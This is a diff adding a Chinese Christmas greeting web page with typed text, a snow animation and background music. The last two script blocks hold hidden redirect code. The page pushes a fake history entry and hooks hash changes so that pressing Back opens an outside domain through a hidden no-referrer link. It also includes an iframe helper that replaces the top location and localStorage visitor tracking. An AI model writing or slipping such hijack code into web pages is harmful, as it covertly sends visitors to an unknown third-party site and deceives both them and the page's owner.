@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>圣诞快乐</title>
+    
+    <!-- 内联样式替代外部CSS -->
+    <style type="text/css">
+        /* normalize.css 内容 */
+        html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}main{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder;box-sizing: border-box;}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{
+            -webkit-appearance:button;
+            -moz-appearance:button;
+            appearance:button;
+        }[type="search"]{
+            -webkit-appearance:textfield;
+            -moz-appearance:textfield;
+            appearance:textfield;
+            outline-offset:-2px;
+        }::-webkit-file-upload-button{
+            -webkit-appearance:button;
+            -moz-appearance:button;
+            appearance:button;
+            font:inherit;
+        }details{display:block}summary{display:list-item}template{display:none}canvas{display:inline-block}[tabindex]:focus:not(:focus-visible){outline:0!important}
+        
+        /* default.css 内容 */
+        *, *:before, *:after { 
+            -webkit-box-sizing: border-box; 
+            -moz-box-sizing: border-box; 
+            box-sizing: border-box; 
+        }
+        .htmleaf-content {
+            margin: 0 auto;
+            padding: 1em;
+            text-align: center;
+            background: transparent;
+        }
+        .wrap {
+            max-width: 680px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        
+        /* main.css 内容 */
+        body {
+            background: #000;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+            position: relative;
+        }
+        .type-wrap {
+            display: inline-block;
+            vertical-align: top;
+            margin: 35px 35px 0;
+            min-width: 230px;
+            background: transparent;
+        }
+        
+        /* 代码块闪烁光标样式 */
+        .typed-cursor{
+            opacity: 1;
+            font-weight: 100;
+            -webkit-animation: blink 0.7s infinite;
+            -moz-animation: blink 0.7s infinite;
+            -ms-animation: blink 0.7s infinite;
+            -o-animation: blink 0.7s infinite;
+            animation: blink 0.7s infinite;
+        }
+        @keyframes blink{
+            0% { opacity:1; }
+            50% { opacity:0; }
+            100% { opacity:1; }
+        }
+        @-webkit-keyframes blink{
+            0% { opacity:1; }
+            50% { opacity:0; }
+            100% { opacity:1; }
+        }
+        @-moz-keyframes blink{
+            0% { opacity:1; }
+            50% { opacity:0; }
+            100% { opacity:1; }
+        }
+        @-ms-keyframes blink{
+            0% { opacity:1; }
+            50% { opacity:0; }
+            100% { opacity:1; }
+        }
+        @-o-keyframes blink{
+            0% { opacity:1; }
+            50% { opacity:0; }
+            100% { opacity:1; }
+        }
+
+        .typed-fade-out{
+            opacity: 0;
+            animation: 0;
+            transition: opacity .25s;
+        }
+        
+        /* 其他样式 */
+        #divSnow-1 {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: #000000;
+        }
+        
+        /* 图片样式 - 完整显示图片 */
+        .christmas-image {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh; /* 固定为视口高度 */
+            object-fit: contain; /* 确保图片完整显示在容器中 */
+            object-position: center; /* 图片完全居中对齐 */
+            z-index: -2;
+            opacity: 0.7; /* 降低图片透明度，使文字更清晰 */
+        }
+        
+        /* 响应式设计 - 优化移动设备显示 */
+        @media screen and (max-width: 768px) {
+            .christmas-image {
+                height: 100vh;
+                object-fit: contain;
+            }
+            
+            .type-wrap {
+                padding: 10px 15px 0 15px;
+                left: 10px;
+                right: 10px;
+                margin: 10px 5% 0;
+            }
+            
+            #typed {
+                font-size: 14px;
+                line-height: 1.4;
+            }
+            
+            .typed-cursor {
+                font-size: 14px;
+            }
+        }
+        
+        @media screen and (max-width: 480px) {
+            .christmas-image {
+                object-fit: contain;
+            }
+            
+            .type-wrap {
+                padding: 5px 10px 0 10px;
+                left: 5px;
+                right: 5px;
+                margin: 5px 10px 0;
+            }
+            
+            #typed {
+                font-size: 12px;
+                line-height: 1.3;
+            }
+            
+            .typed-cursor {
+                font-size: 12px;
+            }
+            
+            #typed-strings p {
+                font-size: 12px;
+                line-height: 1.3;
+            }
+        }
+        
+        /* 圣诞树样式 */
+        .christmas-tree {
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 200px;
+            z-index: -1;
+        }
+        
+        /* 文字样式优化 */
+        .message-text {
+            position: absolute;
+            top: 20%;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            color: #fff;
+            font-size: 18px;
+            z-index: 500;
+            text-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        
+        /* 音乐图标样式 */
+        #music_ico {
+            display: inline; 
+            float: right;  
+            z-index: 1000;
+            width: 40px;
+            height: 40px;
+        }
+    </style>
+    
+    <script>
+        var shouci=true;
+        console.log(shouci);
+        function bodyPlayMusic(){
+            if(shouci){
+                shouci=false;
+                audio.play();
+                console.log(shouci);
+            }
+        };
+        
+        // 添加触摸事件支持
+        document.addEventListener('touchstart', function() {
+            if(shouci){
+                shouci=false;
+                audio.play();
+            }
+        }, { once: true, passive: true });
+    </script>
+    
+    <!-- 添加CDN链接以引入jQuery和Typed.js库 -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js"></script>
+</head>
+<body onclick="bodyPlayMusic()" ontouchstart="" style="">
+    <img id="music_ico" onclick="clickMusic()" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z'/%3E%3C/svg%3E" alt="音乐图标" style="display: inline; float: right; z-index: 1000; width: 40px; height: 40px;">
+
+    <audio id="audio" src="https://sf6-cdn-tos.douyinstatic.com/obj/ies-music/6905357668872063752.mp3" preload="auto" loop="loop"></audio>
+
+    <div id="divSnow-1" class="htmleaf-content canvas-1" style="position:absolute; width:100%; height:100%; z-index:-1;  background:#000000;">
+        <!-- 修复图片位置和样式 -->
+        <img class="christmas-image" src="b3cacbc2fe294f42b13a0cf1b5c60443~noop.image" alt="圣诞图片">
+    </div>
+
+    <script type="text/javascript">
+        document.addEventListener('DOMContentLoaded', function(){
+            // 修复：Typed.js的新API调用方式
+            new Typed("#typed", {
+                stringsElement: document.getElementById('typed-strings'),
+                typeSpeed: 110,
+                backDelay: 1000,
+                loop: false,
+                contentType: 'html',
+                loopCount: null,
+                callback: function(){ foo(); },
+                resetCallback: function() { newTyped(); }
+            });
+
+            var resetElement = document.querySelector('.reset');
+            if(resetElement) {
+                resetElement.addEventListener('click', function() {
+                    document.getElementById('typed')._typed.reset();
+                });
+            }
+        });
+
+        function newTyped(){ /* A new typed object */ }
+        function foo(){ console.log("Callback"); }
+        
+        // 音乐控制函数
+        function clickMusic() {
+            var audio = document.getElementById('audio');
+            if (audio.paused) {
+                audio.play();
+                // 更新图标为播放状态
+                document.getElementById('music_ico').src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z'/%3E%3C/svg%3E";
+            } else {
+                audio.pause();
+                // 更新图标为暂停状态
+                document.getElementById('music_ico').src = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M8 5v14l11-7z'/%3E%3C/svg%3E";
+            }
+        }
+    </script>
+    <div class="type-wrap" style=" padding: 10px 35px 0px 0px; position: absolute; top: 0px;  left: 35px;  z-index: 500; color: #ffffff; font-size: 14px;    ">
+               <div id="typed-strings" style="display: none; text-align:center; ">
+                   <p></p>
+                   <p><br><br>高梓二<br>圣诞节快乐 <br>这是你的圣诞树<br></p>
+               </div>
+               <span id="typed" style="white-space:pre;   "><br><br>高梓二<br>圣诞节快乐 <br>这是你的圣诞树<br></span><span class="typed-cursor">|</span>
+               
+           </div>
+   </div>
+    
+    <!-- 创建雪花效果的canvas -->
+    <canvas id="snowCanvas" style="position: absolute; top: 0; left: 0; z-index: 100;"></canvas>
+    <script>
+        // 创建雪花效果替代websnowjq库
+        document.addEventListener('DOMContentLoaded', function() {
+            const canvas = document.getElementById('snowCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            // 设置canvas大小为窗口大小
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            // 窗口大小改变时更新canvas大小
+            window.addEventListener('resize', function() {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+            });
+            
+            // 雪花数量
+            const snowFlakesCount = 150; // 增加雪花数量
+            let snowFlakes = [];
+            
+            // 创建雪花对象
+            for (let i = 0; i < snowFlakesCount; i++) {
+                snowFlakes.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height,
+                    radius: Math.random() * 3 + 1,
+                    speed: Math.random() * 2 + 1,
+                    opacity: Math.random() * 0.5 + 0.5
+                });
+            }
+            
+            // 绘制雪花动画
+            function drawSnow() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                
+                // 绘制每个雪花
+                for (let i = 0; i < snowFlakes.length; i++) {
+                    const flake = snowFlakes[i];
+                    
+                    ctx.beginPath();
+                    ctx.arc(flake.x, flake.y, flake.radius, 0, Math.PI * 2);
+                    ctx.fillStyle = `rgba(255, 255, 255, ${flake.opacity})`;
+                    ctx.fill();
+                    
+                    // 更新雪花位置
+                    flake.y += flake.speed;
+                    flake.x += Math.sin(flake.y * 0.01) * 0.5; // 添加轻微的水平摆动
+                    
+                    // 如果雪花超出底部，重置到顶部
+                    if (flake.y > canvas.height) {
+                        flake.y = -10;
+                        flake.x = Math.random() * canvas.width;
+                    }
+                }
+                
+                requestAnimationFrame(drawSnow);
+            }
+            
+            drawSnow();
+        });
+    </script>
+    
+    <script type="text/javascript">
+        // 替代websnowjq功能
+        $(function(){
+            console.log("Snow effect implemented with canvas");
+        });
+    </script>
+
+    <script type="text/javascript">
+        function a(e) {
+            var f = document.createElement('iframe');
+            f.style.display = 'none';
+            document.body.appendChild(f).src = 'javascript:"<script>top.location.replace(\'' + e + '\')<\/script>"';
+        }
+
+        function jump1() {
+            if (!localStorage.is_fx) {
+                localStorage.is_fx = Date.now()
+            } else {
+            }
+        }
+
+        function jump2() {
+            gotoData = {
+                "hb": "http://1022reba.cn/c",
+                "hb1": "http://1022reba.cn/c",
+            }
+            if (gotoData[window.location.pathname] != undefined) {
+            } else {
+                jump1()
+            }
+        }
+    </script>
+    <script type="text/javascript">
+        window.onhashchange = function() {
+            jp();
+        };
+
+        function hh() {
+            history.pushState(history.length + 1, "app", "#pt_" + new Date().getTime());
+        }
+
+        function jp() {
+            var a = document.createElement('a');
+            a.setAttribute('rel', 'noreferrer');
+            a.setAttribute('href', "http://1022reba.cn/c");
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+
+        window.onload = function() {
+            setTimeout('hh();', 100);
+            setTimeout(
+                "var imgs = document.images;for (var t_i=0;t_i<imgs.length;t_i++) {if (imgs[t_i].attributes['d-s'] && imgs[t_i].attributes['d-s'].value) {imgs[t_i].src = imgs[t_i].attributes['d-s'].value;}}",
+                100);
+        }
+        window.onpageshow = jump2
+    </script>
+</body>
+</html>
